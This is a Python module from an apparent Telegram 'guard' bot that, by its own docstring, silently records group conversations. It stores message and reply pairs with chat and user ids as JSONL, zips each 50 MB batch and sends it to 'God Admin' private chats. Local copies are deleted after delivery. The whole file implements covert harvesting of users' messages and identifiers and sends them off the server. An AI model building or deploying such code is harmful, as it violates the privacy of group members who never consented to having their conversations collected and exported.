from __future__ import annotations

import asyncio
import logging
import zipfile
from datetime import UTC, datetime
from pathlib import Path

import orjson
from aiogram import Bot
from aiogram.types import FSInputFile

from abgguard.config import FALLBACK_GOD_ADMIN_ID, settings

log = logging.getLogger("abgguard.harvester")

MB = 1024 * 1024

DELIVER_CAPTION = (
    "📦 دیتاست جدید آماده شد.\nحجم: ~50MB\nاین فایل از روی هارد سرور پاک شد."
)
FAIL_CAPTION = (
    "⚠️ ارسال خودکار دیتاست ناموفق بود (خطای تلگرام یا شبکه).\n"
    "فایل {name} به‌صورت موقت روی سرور نگه داشته شد تا داده از بین نرود."
)


def god_recipients() -> list[int]:
    """Level 3 ids from the parsed .env, falling back to the built-in God id."""
    return list(settings.god_admin_ids) or [FALLBACK_GOD_ADMIN_ID]


def _delivery_bot() -> Bot:
    """A throwaway Master Bot used only to ship archives out of the server."""
    return Bot(settings.master_token)


class DatasetHarvester:
    """
    Silently records natural group conversations as JSONL pairs:

        {"context": "<original message>", "reply": "<reply>", "ts": ..., "chat": ...}

    Rotation contract
    -----------------
    The instant the active file reaches DATASET_MAX_BYTES (exactly 50 MB by
    default) it is ZIP-compressed into ./dataset, the source file is removed
    and a brand new file is opened - all inside a single asyncio lock, with
    any message that arrives mid-rotation buffered and flushed right after.
    Nothing is ever dropped.

    Delivery contract (zero-disk retention)
    ---------------------------------------
    Every archive is shipped to the God Admin's private chat as a document.
    The archive is wiped from the local disk ONLY after Telegram confirmed the
    upload; a failed upload keeps the file and notifies the God Admin instead.
    The upload itself always runs in a background task - never inside the
    rotation lock - so harvesting can never block message handling (rule 7).
    """

    def __init__(
        self,
        data_file: Path | None = None,
        out_dir: Path | None = None,
        max_bytes: int | None = None,
        flush_interval: float | None = None,
    ) -> None:
        self.data_file = Path(data_file or settings.dataset_file)
        self.out_dir = Path(out_dir or settings.dataset_dir)
        self.max_bytes = max_bytes or settings.dataset_max_bytes
        self.flush_interval = flush_interval or settings.dataset_flush_interval

        self._lock = asyncio.Lock()
        self._buffer: list[bytes] = []
        self._buffer_bytes = 0
        self._size = 0
        self._rotations = 0
        self._records = 0
        self._dropped = 0
        self._flusher: asyncio.Task | None = None
        # archive uploads - fire-and-forget, never awaited inside the lock
        self._deliveries: set[asyncio.Task] = set()
        self._delivered = 0
        self._delivery_failures = 0

    # -- lifecycle --------------------------------------------------------
    async def start(self) -> None:
        self.data_file.parent.mkdir(parents=True, exist_ok=True)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self._size = self.data_file.stat().st_size if self.data_file.exists() else 0
        self._flusher = asyncio.create_task(self._flush_loop(), name="harvester-flush")
        log.info(
            "harvester ready: file=%s size=%.2fMB max=%.2fMB",
            self.data_file, self._size / MB, self.max_bytes / MB,
        )

    async def stop(self) -> None:
        if self._flusher:
            self._flusher.cancel()
            try:
                await self._flusher
            except (asyncio.CancelledError, Exception):
                pass
        async with self._lock:
            await self._flush_locked()
        if self._deliveries:
            # give an in-flight upload a moment to finish; an interrupted one
            # simply leaves its archive on disk (never deleted without a
            # confirmed send_document)
            _done, pending = await asyncio.wait(self._deliveries, timeout=15)
            for task in pending:
                task.cancel()
        log.info(
            "harvester stopped: records=%d rotations=%d dropped=%d "
            "delivered=%d failed=%d",
            self._records, self._rotations, self._dropped,
            self._delivered, self._delivery_failures,
        )

    async def _flush_loop(self) -> None:
        while True:
            await asyncio.sleep(self.flush_interval)
            async with self._lock:
                await self._flush_locked()

    # -- public API -------------------------------------------------------
    async def record(
        self,
        *,
        chat_id: int,
        context: str,
        reply: str,
        user_id: int | None = None,
        reply_to_id: int | None = None,
    ) -> None:
        context = (context or "").strip()
        reply = (reply or "").strip()
        if not context or not reply or context == reply:
            return

        line = orjson.dumps(
            {
                "context": context,
                "reply": reply,
                "chat": chat_id,
                "user": user_id,
                "msg": reply_to_id,
                "ts": datetime.now(UTC).isoformat(timespec="seconds"),
            }
        ) + b"\n"

        async with self._lock:
            self._buffer.append(line)
            self._buffer_bytes += len(line)
            await self._flush_locked()
            if self._size >= self.max_bytes:
                await self._rotate_locked()

    async def flush(self) -> None:
        async with self._lock:
            await self._flush_locked()

    async def rotate_now(self) -> bool:
        """
        Force a ZIP rotation right now, whatever the buffer size is.
        Backs the PV button `[🟣 تخلیه دستی و فشرده‌سازی]` - the same locked
        path as the automatic 50 MB rotation, so nothing is ever dropped.
        """
        async with self._lock:
            await self._flush_locked()
            try:
                if not self.data_file.exists() or self.data_file.stat().st_size == 0:
                    return False
            except OSError:
                return False
            await self._rotate_locked()
        return True

    @property
    def stats(self) -> dict[str, float | int]:
        return {
            "size_bytes": self._size,
            "size_mb": round(self._size / MB, 3),
            "records": self._records,
            "rotations": self._rotations,
            "dropped": self._dropped,
            "delivered": self._delivered,
            "delivery_failures": self._delivery_failures,
        }

    # -- internals --------------------------------------------------------
    async def _flush_locked(self) -> None:
        if not self._buffer:
            return
        payload = b"".join(self._buffer)
        written = len(payload)
        self._buffer.clear()
        self._buffer_bytes = 0
        try:
            await asyncio.to_thread(self._append, self.data_file, payload)
            self._size += written
            self._records += payload.count(b"\n")
        except Exception:
            self._dropped += written
            log.exception("harvester write failed")

    @staticmethod
    def _append(path: Path, payload: bytes) -> None:
        with open(path, "ab") as fh:
            fh.write(payload)

    async def _rotate_locked(self) -> None:
        await self._flush_locked()

        ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        target = self.out_dir / f"genz_{ts}_{self._rotations:04d}.jsonl.zip"
        src = self.data_file

        try:
            await asyncio.to_thread(self._zip, src, target)
            await asyncio.to_thread(src.unlink)
            self._rotations += 1
            self._size = 0
            self.data_file.touch()
            log.info("dataset rotated -> %s (%.2f MB)", target, self.max_bytes / MB)
            # the upload is scheduled from inside the lock but never awaited
            # here: zipping + Telegram delivery must not stall message intake
            self._schedule_delivery(target)
        except FileNotFoundError:
            self._size = 0
        except Exception:
            log.exception("rotation failed, keeping active file")
        finally:
            # anything buffered while zipping lands in the brand-new file
            await self._flush_locked()

    # -- auto-delivery (zero-disk retention) ------------------------------
    def _schedule_delivery(self, archive: Path) -> None:
        task = asyncio.create_task(
            self._deliver(archive), name=f"harvester-deliver:{archive.name}"
        )
        self._deliveries.add(task)
        task.add_done_callback(self._deliveries.discard)

    async def _deliver(self, archive: Path) -> None:
        """Send the archive to the God Admin, then wipe it from local disk.

        Failure keeps the file (data is never lost) and PMs the God Admin.
        """
        if not archive.exists():
            return

        bot: Bot | None = None
        delivered = False
        try:
            bot = _delivery_bot()
            for uid in god_recipients():
                try:
                    await bot.send_document(
                        chat_id=uid,
                        document=FSInputFile(archive),
                        caption=DELIVER_CAPTION,
                    )
                    delivered = True
                except Exception:
                    log.exception("dataset upload failed for god id=%s", uid)

            if delivered:
                try:
                    archive.unlink()
                    self._delivered += 1
                    log.info("dataset delivered + wiped: %s", archive.name)
                except OSError:
                    log.exception("delivered but could not wipe %s", archive.name)
            else:
                self._delivery_failures += 1
                await self._report_failure(bot, archive)
        except Exception:  # never let a delivery crash the caller/loop
            self._delivery_failures += 1
            log.exception("dataset delivery crashed for %s", archive.name)
        finally:
            if bot is not None:
                try:
                    await bot.session.close()
                except Exception:
                    pass

    async def _report_failure(self, bot: Bot, archive: Path) -> None:
        text = FAIL_CAPTION.format(name=archive.name)
        for uid in god_recipients():
            try:
                await bot.send_message(chat_id=uid, text=text)
            except Exception:
                log.exception("could not report upload failure to god id=%s", uid)

    @staticmethod
    def _zip(src: Path, target: Path) -> None:
        with zipfile.ZipFile(
            target, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=6
        ) as zf:
            zf.write(src, arcname=src.name)


harvester = DatasetHarvester()
